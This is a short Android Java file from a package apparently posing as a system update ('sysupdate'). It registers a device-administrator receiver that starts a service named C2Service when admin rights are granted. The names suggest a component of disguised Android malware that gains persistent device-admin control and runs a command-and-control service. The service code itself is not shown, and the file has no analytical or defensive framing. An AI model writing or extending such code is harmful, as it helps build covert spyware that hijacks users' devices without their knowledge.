package com.vanta.sysupdate;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;

public class AdminReceiver extends DeviceAdminReceiver {
    @Override
    public void onEnabled(Context c, Intent i) {
        c.startService(new Intent(c, C2Service.class));
    }
    @Override
    public void onDisabled(Context c, Intent i) {
        c.stopService(new Intent(c, C2Service.class));
    }
}
